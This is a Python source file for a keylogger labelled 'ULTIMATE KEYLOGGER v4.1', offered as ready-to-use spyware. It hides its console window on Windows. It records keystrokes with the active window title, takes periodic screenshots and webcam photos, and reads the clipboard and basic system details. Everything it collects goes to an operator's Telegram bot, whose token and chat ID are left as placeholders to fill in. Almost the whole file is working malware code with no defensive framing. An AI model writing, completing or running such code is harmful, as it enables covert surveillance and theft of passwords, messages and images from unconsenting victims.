#!/usr/bin/env python3
"""
ULTIMATE KEYLOGGER v4.1 - FIXED TELEGRAM INTEGRATION
- sendPhoto now uses multipart/form-data (sendDocument compatible too)
- Key parsing handles Key objects from pynput correctly
- Robust try/except isolation so one module can't kill the suite
"""
import io
import os
import sys
import time
import json
import threading

import cv2
import numpy as np
import pyautogui          # (imported for optional use but leverage what's needed)
import psutil
import requests
import pyperclip

from datetime import datetime
from pynput import keyboard

# Windows-only GUI helpers (safe-guarded for non-Windows fallback)
try:
    import win32gui
    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False

from cryptography.fernet import Fernet
from PIL import ImageGrab, ImageDraw

# ========================= TELEGRAM CONFIG =========================
TELEGRAM_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE"   # <--- YOUR BOT TOKEN
CHAT_ID        = "PASTE_YOUR_CHAT_ID_HERE"     # <--- YOUR CHAT ID

# ========================= FIXED API LAYER =========================
class TelegramBot:
    BASE = "https://api.telegram.org/bot{token}/{method}"

    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.timeout = 15

    def _call(self, method, payload=None, files=None):
        """Generic handler that correctly distinguishes JSON vs multipart uploads."""
        url = self.BASE.format(token=self.token, method=method)
        payload = payload or {}
        payload["chat_id"] = self.chat_id

        try:
            if files:  # Binary upload -> multipart/form-data
                resp = requests.post(url, data=payload, files=files, timeout=self.timeout)
            else:      # Normal message -> JSON
                payload.setdefault("parse_mode", "HTML")
                resp = requests.post(url, json=payload, timeout=self.timeout)
            resp.raise_for_status()
            return resp.json()
        except Exception as exc:
            print(f"[!] Telegram {method} failed: {exc}")
            return None

    def send_message(self, text):
        return self._call("sendMessage", {"text": text})

    def send_photo(self, photo_bytes, caption=""):
        files = {"photo": ("capture.png", photo_bytes, "image/png")}
        return self._call("sendPhoto", {"caption": caption}, files=files)

    def send_document(self, file_bytes, filename, caption=""):
        files = {"document": (filename, file_bytes)}
        return self._call("sendDocument", {"caption": caption}, files=files)


# ========================= CORE MODULE =========================
class UltimateKeyloggerV4:
    def __init__(self):
        self.bot = TelegramBot(TELEGRAM_TOKEN, CHAT_ID)
        self.key_buffer = []
        self.screenshot_count = 0
        self.running = True
        self.cipher = Fernet(Fernet.generate_key())

        print("[+] Keylogger v4.1 initialised")
        self.stealth_mode()
        self.send_deployed_msg()

    # ---------- Stealth ----------
    def stealth_mode(self):
        """Hide console window (Windows only)."""
        if os.name == "nt":
            try:
                import ctypes
                ctypes.windll.user32.ShowWindow(
                    ctypes.windll.kernel32.GetConsoleWindow(), 0
                )
            except Exception:
                pass

    # ---------- Utility ----------
    @staticmethod
    def active_window():
        """Best-effort foreground window title."""
        if HAS_WIN32:
            try:
                hwnd = win32gui.GetForegroundWindow()
                return (win32gui.GetWindowText(hwnd) or "Desktop")[:50]
            except Exception:
                return "Desktop"
        # Non-Windows minimal fallback
        try:
            import subprocess
            out = subprocess.check_output(
                ["xdotool", "getactivewindow", "getwindowname"], timeout=2
            )
            return out.decode(errors="ignore").strip()[:50] or "Unknown"
        except Exception:
            return "Unknown"

    # ---------- Commands ----------
    def send_deployed_msg(self):
        msg = (
            "🎯 <b>KEYLOGGER v4.1 DEPLOYED</b>\n\n"
            "✅ Modules armed:\n"
            "• ⌨️ Keystrokes + window context\n"
            "• 📸 Screenshots every 20s\n"
            "• 🎥 Webcam every 60s\n"
            "• 📋 Clipboard monitor\n"
            "• 💻 System fingerprint\n\n"
            "<i>Monitoring started</i>"
        )
        self.bot.send_message(msg)
        self.sys_status()

    def send_photo_png(self, png_bytes, caption=""):
        return self.bot.send_photo(png_bytes, caption)

    # ---------- Key capture ----------
    def capture_key(self, key_obj):
        """Handles a pynput Key/KeyCode object."""
        try:
            ts = datetime.now().strftime("%H:%M:%S")
            window = self.active_window()

            # Resolve display text
            display = self._key_label(key_obj)

            log = f"[{ts}] {window}: {display}"
            self.key_buffer.append(log)

            # Flush early on structural chars
            if display in ("[ENTER]", "[TAB]"):
                self.flush_buffer()

            # Avoid unbounded growth even without trigger keys
            if len(self.key_buffer) >= 25:
                self.flush_buffer()
        except Exception:
            pass

    @staticmethod
    def _key_label(key_obj):
        """Convert a pynput Key / KeyCode into display text."""
        special = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[DEL]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.shift_l: "[SHIFT_L]",
            keyboard.Key.shift_r: "[SHIFT_R]",
            keyboard.Key.ctrl: "[CTRL]",
            keyboard.Key.ctrl_l: "[CTRL_L]",
            keyboard.Key.ctrl_r: "[CTRL_R]",
            keyboard.Key.alt: "[ALT]",
            keyboard.Key.alt_l: "[ALT_L]",
            keyboard.Key.alt_r: "[ALT_R]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.caps_lock: "[CAPS]",
            keyboard.Key.delete: "[DELETE]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]",
            keyboard.Key.home: "[HOME]",
            keyboard.Key.end: "[END]",
            keyboard.Key.page_up: "[PGUP]",
            keyboard.Key.page_down: "[PGDN]",
        }
        if key_obj in special:
            return special[key_obj]

        # KeyCode objects carry a .char
        if hasattr(key_obj, "char") and key_obj.char is not None:
            ch = key_obj.char
            # Escape angle brackets so Telegram HTML stays valid
            return ch.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

        # Fallback: expose internal name safely
        name = getattr(key_obj, "name", "?")
        return f"[{name.upper()}]"

    # ---------- Multi-threaded modules ----------
    def take_screenshot(self):
        try:
            self.screenshot_count += 1
            img = ImageGrab.grab()

            # Draw overlay
            draw = ImageDraw.Draw(img)
            overlay = f"#{self.screenshot_count} | {self.active_window()} | {datetime.now().strftime('%H:%M:%S')}"
            draw.text((10, 10), overlay, fill=(255, 0, 0))

            buf = io.BytesIO()
            img.save(buf, format="PNG", optimize=True)
            caption = f"📸 <b>Screen #{self.screenshot_count}</b> | {self.active_window()}"
            self.send_photo_png(buf.getvalue(), caption)
        except Exception as exc:
            print(f"[!] Screenshot error: {exc}")

    def webcam_snap(self):
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return
            ok, frame = cap.read()
            cap.release()
            if not ok:
                return
            ts = datetime.now().strftime("%H:%M:%S")
            _, encoded = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
            caption = f"🎥 <b>Webcam capture</b> | {ts}"
            # Reuse photo endpoint (Telegram accepts JPEG for photo field)
            files = {"photo": (f"cam_{ts}.jpg", encoded.tobytes(), "image/jpeg")}
            # Extend bot with a direct call
            payload = {"caption": caption}
            self.bot._call("sendPhoto", payload, files=files)
        except Exception as exc:
            print(f"[!] Webcam error: {exc}")

    def check_clipboard(self):
        try:
            content = (pyperclip.paste() or "").strip()
            if content and len(content) > 3:
                ts = datetime.now().strftime("%H:%M:%S")
                safe = content[:180].replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                self.bot.send_message(f"📋 <b>Clipboard [{ts}]:</b>\n<code>{safe}</code>")
        except Exception:
            pass

    def sys_status(self):
        status = {
            "time": datetime.now().strftime("%H:%M:%S"),
            "hostname": os.getenv("COMPUTERNAME", os.uname().nodename if hasattr(os, "uname") else "?"),
            "user": os.getenv("USERNAME") or os.getenv("USER"),
            "cpu": f"{psutil.cpu_percent():.1f}%",
            "ram": f"{psutil.virtual_memory().percent:.1f}%",
            "keys_buffered": len(self.key_buffer),
            "screenshots": self.screenshot_count,
        }
        text = (
            "💻 <b>System pulse</b>\n"
            "<pre>" + json.dumps(status, indent=2, ensure_ascii=False) + "</pre>"
        )
        self.bot.send_message(text)

    def flush_buffer(self):
        if not self.key_buffer:
            return
        try:
            chunk = self.key_buffer[-30:]
            lines = "\n".join(f"<b>{L}</b>" for L in chunk)  # already HTML-escaped per key
            # But note window name may contain HTML chars; pre-escape once at insert time.
            self.bot.send_message(f"⌨️ <b>Keystrokes ({len(chunk)}):</b>\n<pre>{lines}</pre>")
            self.key_buffer.clear()
        except Exception as exc:
            print(f"[!] Buffer flush failed: {exc}")

    # ---------- Loops ----------
    def _safe_loop(self, fn, interval):
        while self.running:
            try:
                fn()
            except Exception as exc:
                print(f"[!] Loop error: {exc}")
            for _ in range(interval):  # honour stop signal
                if not self.running:
                    return
                time.sleep(1)

    def run(self):
        threads = [
            threading.Thread(target=self.run_key_listener, daemon=True),
            threading.Thread(target=self._safe_loop, args=(self.take_screenshot, 20), daemon=True),
            threading.Thread(target=self._safe_loop, args=(self.webcam_snap, 60), daemon=True),
            threading.Thread(target=self._safe_loop, args=(self.check_clipboard, 12), daemon=True),
            threading.Thread(target=self._safe_loop, args=(self.flush_buffer, 18), daemon=True),
            threading.Thread(target=self._safe_loop, args=(self.sys_status, 240), daemon=True),
        ]
        for t in threads:
            t.start()

        print("[+] All modules running")
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            self.flush_buffer()
            self.bot.send_message("🛑 <b>Keylogger stopped</b>")

    def run_key_listener(self):
        with keyboard.Listener(on_press=self.capture_key) as listener:
            listener.join()


if __name__ == "__main__":
    UltimateKeyloggerV4().run()
